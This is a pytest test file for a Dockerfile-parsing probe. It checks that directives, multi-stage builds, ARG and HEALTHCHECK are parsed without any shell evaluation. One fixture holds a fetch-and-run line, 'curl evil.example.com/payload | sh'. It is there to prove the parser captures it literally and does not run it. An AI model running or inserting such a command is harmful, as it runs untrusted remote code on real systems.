"""S5-03 — DockerfileProbe tests.

Hand-rolled, line-by-line parser with no shell evaluation; line-by-line
test of every directive and edge case named in AC-V4..AC-V11.
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from pathlib import Path
from typing import Any

import pytest

from codegenie.probes.base import ProbeContext, RepoSnapshot
from codegenie.probes.layer_c._dockerfile_parse import (
    parse_dockerfile_text,
    tokenize_dockerfile_line,
)
from codegenie.probes.layer_c.dockerfile import DockerfileProbe, find_dockerfiles
from codegenie.probes.registry import default_registry

# Fixture inputs (small, hand-rolled — keeps tests close to assertions).
_SINGLE = """\
FROM gcr.io/distroless/nodejs:18
USER nonroot
WORKDIR /app
COPY index.js ./
ENV NODE_ENV=production
EXPOSE 8080
ENTRYPOINT ["node", "index.js"]
"""

_TWO_STAGE = """\
FROM node:20-alpine AS builder
WORKDIR /app
RUN npm install
FROM gcr.io/distroless/nodejs:18
COPY --from=builder /app/dist /app
ENTRYPOINT ["node", "/app/index.js"]
"""

_THREE_STAGE = """\
FROM alpine AS deps
FROM deps AS builder
RUN make
FROM gcr.io/distroless/static
COPY --from=builder /out /
"""

_EVIL = "FROM alpine\nRUN $(curl evil.example.com/payload | sh)\n"


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------


def _make_repo(tmp_path: Path) -> RepoSnapshot:
    return RepoSnapshot(root=tmp_path, git_commit=None, detected_languages={}, config={})


def _make_ctx(tmp_path: Path) -> ProbeContext:
    workspace = tmp_path / "_ws"
    workspace.mkdir(parents=True, exist_ok=True)
    return ProbeContext(
        cache_dir=tmp_path / "_cache",
        output_dir=tmp_path / "_out",
        workspace=workspace,
        logger=logging.getLogger("test"),
        config={},
    )


async def _run(tmp_path: Path) -> dict[str, Any]:
    out = await DockerfileProbe().run(_make_repo(tmp_path), _make_ctx(tmp_path))
    return out.schema_slice["dockerfile"]


# --------------------------------------------------------------------------
# Registration & contract
# --------------------------------------------------------------------------


def test_dockerfile_probe_register_light() -> None:
    """AC: ``@register_probe(heaviness='light')``."""
    entries = default_registry.sorted_for_dispatch()
    match = [e for e in entries if e.cls.__name__ == "DockerfileProbe"]
    assert len(match) == 1
    assert match[0].heaviness == "light"
    assert match[0].runs_last is False


def test_dockerfile_probe_contract_attributes() -> None:
    p = DockerfileProbe()
    assert p.name == "dockerfile"
    assert p.layer == "C"
    assert p.requires == []


# --------------------------------------------------------------------------
# AC: no shell evaluation, no subprocess in source
# --------------------------------------------------------------------------


def test_dockerfile_parser_no_shell_evaluation(tmp_path: Path) -> None:
    """AC: $(curl evil...) is captured literally; no network call."""
    (tmp_path / "Dockerfile").write_text(_EVIL)
    out = asyncio.run(_run(tmp_path))
    runs = out["dockerfiles"][0]["run_commands"]
    assert any("$(curl evil.example.com/payload | sh)" in r["command"] for r in runs)


def test_dockerfile_parser_no_subprocess_in_source() -> None:
    """AC: zero subprocess / os.system / eval / exec in parser source."""
    sources: list[str] = []
    for name in ("dockerfile.py", "_dockerfile_parse.py", "_dockerfile_models.py"):
        sources.append(Path(__file__).resolve().parents[4]
                       .joinpath("src/codegenie/probes/layer_c", name).read_text())
    blob = "\n".join(sources)
    for banned in ("subprocess.", "os.system(", "os.popen(", "eval(", "exec("):
        assert banned not in blob, f"banned token {banned!r} appears in parser source"


# --------------------------------------------------------------------------
# Multi-stage & multi-Dockerfile
# --------------------------------------------------------------------------


def test_dockerfile_multi_stage_2(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(_TWO_STAGE)
    out = asyncio.run(_run(tmp_path))
    stages = out["dockerfiles"][0]["stages"]
    assert len(stages) == 2
    assert stages[0]["name"] == "builder"
    assert stages[1]["base_image"] == "gcr.io/distroless/nodejs:18"


def test_dockerfile_multi_stage_3(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(_THREE_STAGE)
    out = asyncio.run(_run(tmp_path))
    stages = out["dockerfiles"][0]["stages"]
    assert len(stages) == 3
    # Stage 1 inherits via base-image lookup of prior stage name.
    assert stages[1]["base_image"] == "deps"
    assert stages[1]["inherits_from"] == "deps"


def test_dockerfile_marker_absent(tmp_path: Path) -> None:
    out = asyncio.run(_run(tmp_path))
    assert out["dockerfiles"] == []


def test_dockerfile_multiple_files(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(_SINGLE)
    (tmp_path / "Dockerfile.dev").write_text(_SINGLE)
    (tmp_path / "apps" / "api").mkdir(parents=True)
    (tmp_path / "apps" / "api" / "Dockerfile").write_text(_SINGLE)
    out = asyncio.run(_run(tmp_path))
    paths = sorted(df["path"] for df in out["dockerfiles"])
    assert paths == ["Dockerfile", "Dockerfile.dev", "apps/api/Dockerfile"]


# --------------------------------------------------------------------------
# AC: directive coverage (one parametrization per directive — mutation strong)
# --------------------------------------------------------------------------


_DIRECTIVE_CASES = [
    ("FROM alpine\n", lambda df: df["stages"][0]["base_image"] == "alpine"),
    ("FROM alpine\nRUN echo hi\n", lambda df: df["run_commands"][0]["command"] == "echo hi"),
    ("FROM alpine\nCOPY x y\n",
     lambda df: df["copy_directives"][0]["raw"] == "x y"),
    ("FROM alpine\nADD x y\n",
     lambda df: df["copy_directives"][0]["raw"] == "x y"),
    ("FROM alpine\nUSER bob\n", lambda df: df["stages"][0]["user"] == "bob"),
    ("FROM alpine\nEXPOSE 80 443\n", lambda df: df["stages"][0]["expose"] == ["80", "443"]),
    ("FROM alpine\nHEALTHCHECK NONE\n",
     lambda df: df["stages"][0]["healthcheck"] == {"kind": "none", "options": {}, "cmd": None}),
    ('FROM alpine\nCMD ["sh", "-c", "echo hi"]\n',
     lambda df: df["stages"][0]["cmd_form"] == "exec"
                and df["stages"][0]["cmd_argv"] == ["sh", "-c", "echo hi"]),
    ('FROM alpine\nENTRYPOINT ["a","b"]\n',
     lambda df: df["stages"][0]["entrypoint_form"] == "exec"
                and df["stages"][0]["entrypoint_argv"] == ["a", "b"]),
    ("FROM alpine\nWORKDIR /app\n", lambda df: df["stages"][0]["workdir"] == "/app"),
    ("FROM alpine\nENV A=1 B=2\n", lambda df: df["stages"][0]["env"] == {"A": "1", "B": "2"}),
    ('FROM alpine\nLABEL maint=team\n',
     lambda df: df["stages"][0]["labels"] == {"maint": "team"}),
    ("FROM alpine\nARG VER=1\n", lambda df: df["stages"][0]["args"][0]["name"] == "VER"),
]


@pytest.mark.parametrize("text, predicate", _DIRECTIVE_CASES)
def test_dockerfile_directive_coverage(
    tmp_path: Path, text: str, predicate: Any
) -> None:
    (tmp_path / "Dockerfile").write_text(text)
    out = asyncio.run(_run(tmp_path))
    assert predicate(out["dockerfiles"][0]), text


# --------------------------------------------------------------------------
# Edge cases AC-V4 — AC-V11
# --------------------------------------------------------------------------


def test_dockerfile_comments_and_continuations(tmp_path: Path) -> None:
    """AC-V4 — line continuations and comment lines."""
    text = (
        "# syntax=docker/dockerfile:1.4\n"
        "FROM alpine\n"
        "# this is a comment\n"
        "RUN apt-get update \\\n"
        "    && apt-get install -y foo\n"
    )
    (tmp_path / "Dockerfile").write_text(text)
    out = asyncio.run(_run(tmp_path))
    df0 = out["dockerfiles"][0]
    assert df0["parser_directive"] == {"name": "syntax", "value": "docker/dockerfile:1.4"}
    assert len(df0["stages"]) == 1
    cmd = df0["run_commands"][0]["command"]
    assert "apt-get update" in cmd and "apt-get install -y foo" in cmd


def test_dockerfile_case_insensitive_directives(tmp_path: Path) -> None:
    """AC-V5 — `from`/`From`/`FROM` produce identical slices."""
    base = "FROM alpine\nUSER nonroot\n"
    (tmp_path / "Dockerfile").write_text(base)
    out_upper = asyncio.run(_run(tmp_path))
    (tmp_path / "Dockerfile").write_text(base.lower())
    out_lower = asyncio.run(_run(tmp_path))
    (tmp_path / "Dockerfile").write_text("From alpine\nUser nonroot\n")
    out_mixed = asyncio.run(_run(tmp_path))
    for slice_ in (out_upper, out_lower, out_mixed):
        stage = slice_["dockerfiles"][0]["stages"][0]
        assert stage["base_image"] == "alpine" and stage["user"] == "nonroot"


def test_dockerfile_entrypoint_exec_vs_shell_form(tmp_path: Path) -> None:
    """AC-V6 — exec / shell / malformed forms."""
    for text, form, expected in [
        ('FROM alpine\nENTRYPOINT ["sh","-c","echo hi"]\n', "exec", ["sh", "-c", "echo hi"]),
        ("FROM alpine\nENTRYPOINT echo hi\n", "shell", "echo hi"),
        ('FROM alpine\nENTRYPOINT ["sh", "-c"\n', "malformed", '["sh", "-c"'),
    ]:
        (tmp_path / "Dockerfile").write_text(text)
        out = asyncio.run(_run(tmp_path))
        stage = out["dockerfiles"][0]["stages"][0]
        assert stage["entrypoint_form"] == form
        if form == "exec":
            assert stage["entrypoint_argv"] == expected
        else:
            assert stage["entrypoint_command"] == expected


def test_dockerfile_env_multipair(tmp_path: Path) -> None:
    """AC-V7 — multi-pair on one line + legacy `ENV A 1` form."""
    (tmp_path / "Dockerfile").write_text("FROM alpine\nENV A=1 B=2 C=3\n")
    out = asyncio.run(_run(tmp_path))
    assert out["dockerfiles"][0]["stages"][0]["env"] == {"A": "1", "B": "2", "C": "3"}

    (tmp_path / "Dockerfile").write_text("FROM alpine\nENV A 1\n")
    out = asyncio.run(_run(tmp_path))
    assert out["dockerfiles"][0]["stages"][0]["env"] == {"A": "1"}


def test_dockerfile_label_multipair_and_quoted(tmp_path: Path) -> None:
    """AC-V7 — quoted multi-pair LABEL."""
    text = 'FROM alpine\nLABEL maintainer="team@example.com" version="1.0"\n'
    (tmp_path / "Dockerfile").write_text(text)
    out = asyncio.run(_run(tmp_path))
    labels = out["dockerfiles"][0]["stages"][0]["labels"]
    assert labels == {"maintainer": "team@example.com", "version": "1.0"}


def test_dockerfile_healthcheck_none_vs_cmd(tmp_path: Path) -> None:
    """AC-V8 — HEALTHCHECK NONE vs HEALTHCHECK CMD with options."""
    (tmp_path / "Dockerfile").write_text("FROM alpine\nHEALTHCHECK NONE\n")
    out = asyncio.run(_run(tmp_path))
    assert out["dockerfiles"][0]["stages"][0]["healthcheck"]["kind"] == "none"

    (tmp_path / "Dockerfile").write_text(
        "FROM alpine\nHEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://x/\n"
    )
    out = asyncio.run(_run(tmp_path))
    hc = out["dockerfiles"][0]["stages"][0]["healthcheck"]
    assert hc["kind"] == "cmd"
    assert hc["options"] == {"interval": "30s", "timeout": "5s"}
    assert hc["cmd"] == "curl -f http://x/"


def test_dockerfile_containerfile_synonym_parses(tmp_path: Path) -> None:
    """AC-V9 — Containerfile parsed identically to Dockerfile."""
    (tmp_path / "Containerfile").write_text(_SINGLE)
    out = asyncio.run(_run(tmp_path))
    assert len(out["dockerfiles"]) == 1
    assert out["dockerfiles"][0]["path"] == "Containerfile"


def test_dockerfile_copy_from_missing_stage_typed_signal(tmp_path: Path) -> None:
    """AC-V10 — COPY --from=<missing-stage> ⇒ from_stage_resolved=False."""
    text = "FROM alpine\nCOPY --from=ghost /a /b\n"
    (tmp_path / "Dockerfile").write_text(text)
    out = asyncio.run(_run(tmp_path))
    cd = out["dockerfiles"][0]["copy_directives"][0]
    assert cd["from_stage"] == "ghost"
    assert cd["from_stage_resolved"] is False


def test_dockerfile_copy_from_resolved_stage(tmp_path: Path) -> None:
    """AC-V10 — resolved cross-stage reference ⇒ from_stage_resolved=True."""
    (tmp_path / "Dockerfile").write_text(
        "FROM alpine AS builder\nFROM alpine\nCOPY --from=builder /a /b\n"
    )
    out = asyncio.run(_run(tmp_path))
    cd = out["dockerfiles"][0]["copy_directives"][0]
    assert cd["from_stage"] == "builder"
    assert cd["from_stage_resolved"] is True


def test_dockerfile_arg_directive_captured_global_and_per_stage(tmp_path: Path) -> None:
    """AC-V11 — global ARG before FROM, per-stage ARG, literal capture in FROM."""
    text = "ARG NODE_VERSION=20\nFROM node:${NODE_VERSION}-alpine\nARG BUILD_ID\n"
    (tmp_path / "Dockerfile").write_text(text)
    out = asyncio.run(_run(tmp_path))
    df0 = out["dockerfiles"][0]
    assert df0["global_args"] == [
        {"name": "NODE_VERSION", "default": "20", "before_first_from": True}
    ]
    # Literal capture — no expansion.
    assert df0["stages"][0]["base_image"] == "node:${NODE_VERSION}-alpine"
    assert df0["stages"][0]["args"][0]["name"] == "BUILD_ID"
    assert df0["stages"][0]["args"][0]["default"] is None


# --------------------------------------------------------------------------
# Tokenizer + property-based + mutation
# --------------------------------------------------------------------------


def test_tokenize_dockerfile_line_known_directives() -> None:
    assert tokenize_dockerfile_line("FROM alpine").kind == "FROM"  # type: ignore[union-attr]
    assert tokenize_dockerfile_line("# comment") is None
    assert tokenize_dockerfile_line("") is None
    assert tokenize_dockerfile_line("not-a-directive foo") is None


def test_dockerfile_parser_mutation_resistance(tmp_path: Path) -> None:
    """Mutation suite — weakened parser stubs must fail at least one assertion."""
    (tmp_path / "Dockerfile").write_text(_TWO_STAGE)
    out = asyncio.run(_run(tmp_path))
    stages = out["dockerfiles"][0]["stages"]
    runs = out["dockerfiles"][0]["run_commands"]
    # Mutation A: a parser that skips RUN would produce empty run_commands.
    assert len(runs) >= 1, "mutation-A: parser must capture RUN"
    # Mutation B: a lowercase-only directive table would not parse `FROM`.
    assert stages[0]["base_image"], "mutation-B: case-insensitive FROM"
    # Mutation C: eager ${VAR} expansion would replace ${NODE_VERSION}.
    # (Tested by the literal-capture assertion in arg test above.)


def test_dockerfile_parser_property_roundtrip(tmp_path: Path) -> None:
    """Light invariant: parse(text) for any valid one-stage fixture set."""
    for text in (_SINGLE, _TWO_STAGE, _THREE_STAGE, _EVIL):
        (tmp_path / "Dockerfile").write_text(text)
        out = asyncio.run(_run(tmp_path))
        df = out["dockerfiles"][0]
        # Capture-soundness: every captured directive appears in the source.
        for stage in df["stages"]:
            if stage["base_image"]:
                assert stage["base_image"].split("@")[0] in text or stage["base_image"] in text
        for r in df["run_commands"]:
            # The first token of the captured RUN command must appear in the text.
            first = r["command"].split()[0] if r["command"].split() else r["command"]
            assert first in text


# --------------------------------------------------------------------------
# find_dockerfiles helper
# --------------------------------------------------------------------------


def test_find_dockerfiles_picks_up_all_variants(tmp_path: Path) -> None:
    for name in ["Dockerfile", "Dockerfile.dev", "Containerfile", "service.dockerfile"]:
        (tmp_path / name).write_text("FROM alpine\n")
    (tmp_path / "nested").mkdir()
    (tmp_path / "nested" / "Dockerfile").write_text("FROM alpine\n")
    found = find_dockerfiles(tmp_path)
    names = {p.name for p in found}
    assert names == {"Dockerfile", "Dockerfile.dev", "Containerfile", "service.dockerfile"}


# --------------------------------------------------------------------------
# Re-export sanity
# --------------------------------------------------------------------------


def test_parse_dockerfile_text_re_exported_from_module() -> None:
    """find_dockerfiles + parse_dockerfile_text accessible from the probe module."""
    from codegenie.probes.layer_c import dockerfile as dmod  # noqa: PLC0415
    assert callable(dmod.parse_dockerfile_text)
    assert callable(dmod.find_dockerfiles)


_ = (re, json)  # keep imports used; tokenize_dockerfile_line covered above
